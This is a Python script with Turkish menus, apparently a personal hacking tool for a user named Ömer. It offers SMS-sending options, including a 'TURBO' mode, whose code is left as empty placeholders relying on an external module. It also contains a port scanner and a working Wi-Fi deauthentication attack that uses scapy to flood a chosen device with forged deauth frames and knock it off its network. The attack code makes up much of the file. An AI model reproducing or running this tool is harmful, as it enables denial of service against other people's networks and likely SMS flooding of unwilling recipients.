from colorama import Fore, Style, init
from time import sleep
from os import system
import socket
import threading
from scapy.all import * # Deauth için gerekli

# SMS modülünü import ediyoruz (Dosyanın yanında sms.py olmalı)
try:
    from sms import SendSms
except ImportError:
    SendSms = None

init(autoreset=True)

# Servisleri hazırla
servisler_sms = []
if SendSms:
    for attribute in dir(SendSms):
        attribute_value = getattr(SendSms, attribute)
        if callable(attribute_value) and not attribute.startswith('__'):
            servisler_sms.append(attribute)

def banner():
    system("cls||clear")
    print(f"""{Fore.LIGHTCYAN_EX}
    ██████╗ ███╗   ███╗███████╗██████╗ 
    ██╔══██╗████╗ ████║██╔════╝██╔══██╗
    ██║  ██║██╔████╔██║█████╗  ██████╔╝
    ██║  ██║██║╚██╔╝██║██╔══╝  ██╔══██╗
    ██████╔╝██║ ╚═╝ ██║███████╗██║  ██║
    ╚═════╝ ╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝
                                       
    {Fore.LIGHTYELLOW_EX}>> Yapımcı: Ömer
    {Fore.LIGHTGREEN_EX}>> Aktif SMS Servis: {len(servisler_sms)}
    {Fore.LIGHTWHITE_EX}---------------------------------------
    """)

# --- YENİ ÖZELLİKLER ---

def port_scanner():
    banner()
    target = input(f"{Fore.LIGHTYELLOW_EX}Hedef Site/IP: {Fore.LIGHTWHITE_EX}").strip().replace("http://", "").replace("https://", "")
    try:
        target_ip = socket.gethostbyname(target)
        print(f"\n{Fore.LIGHTGREEN_EX}[+] Hedef IP: {target_ip}")
    except:
        print(f"{Fore.LIGHTRED_EX}[!] Site çözülemedi!"); sleep(2); return

    common_ports = [21, 22, 23, 25, 53, 80, 110, 443, 3306, 3389, 8080]
    print(f"{Fore.LIGHTCYAN_EX}[*] Tarama başladı, Ömer...\n")
    
    for port in common_ports:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        result = s.connect_ex((target_ip, port))
        if result == 0:
            print(f"{Fore.LIGHTGREEN_EX} [!] PORT AÇIK: {port}")
        s.close()
    input(f"\n{Fore.LIGHTYELLOW_EX}Geri dönmek için Enter...")

def deauth_attack():
    banner()
    print(f"{Fore.LIGHTRED_EX}[!] DİKKAT: Kartın monitor modda (wlan0mon) olmalı!")
    target_mac = input(f"{Fore.LIGHTYELLOW_EX}Hedef Cihaz MAC: {Fore.LIGHTWHITE_EX}")
    gateway_mac = input(f"{Fore.LIGHTYELLOW_EX}Modem (BSSID) MAC: {Fore.LIGHTWHITE_EX}")
    iface = "wlan0mon" # Genelde bu isim olur
    
    print(f"\n{Fore.LIGHTRED_EX}[!!!] PAKETLER FIRLATILIYOR. DURDURMAK İÇİN CTRL+C ÖMER!")
    pkt = RadioTap()/Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)/Dot11Deauth(reason=7)
    
    try:
        while True:
            sendp(pkt, iface=iface, count=100, inter=0.1, verbose=False)
    except KeyboardInterrupt:
        print(f"\n{Fore.LIGHTYELLOW_EX}Saldırı durduruldu.")
        sleep(2)

# --- ANA DÖNGÜ ---

while True:
    banner()
    try:
        print(f"{Fore.LIGHTMAGENTA_EX} [1] SMS Gönder (Normal)")
        print(f"{Fore.LIGHTMAGENTA_EX} [2] SMS Gönder {Fore.LIGHTRED_EX}(TURBO)")
        print(f"{Fore.LIGHTCYAN_EX} [3] Port Scanner (Hızlı Keşif)")
        print(f"{Fore.LIGHTRED_EX} [4] Deauth Attack (Ağdan Düşür)")
        print(f"{Fore.LIGHTWHITE_EX} [5] Çıkış Yap\n")
        
        secim = input(f"{Fore.LIGHTYELLOW_EX} Ömer, ne yapmak istersin?: {Fore.LIGHTWHITE_EX}")
        if secim == "": continue
        secim = int(secim)
    except ValueError:
        print(f"\n{Fore.LIGHTRED_EX}[!] Rakam gir Ömer!")
        sleep(2); continue

    if secim == 1:
        # Mevcut SMS kodların buraya gelecek (tel_no input vb.)
        pass 

    elif secim == 2:
        # Mevcut Turbo mod kodların buraya gelecek
        pass

    elif secim == 3:
        port_scanner()

    elif secim == 4:
        deauth_attack()

    elif secim == 5:
        print(f"\n{Fore.LIGHTCYAN_EX}Görüşürüz Ömer!")
        break
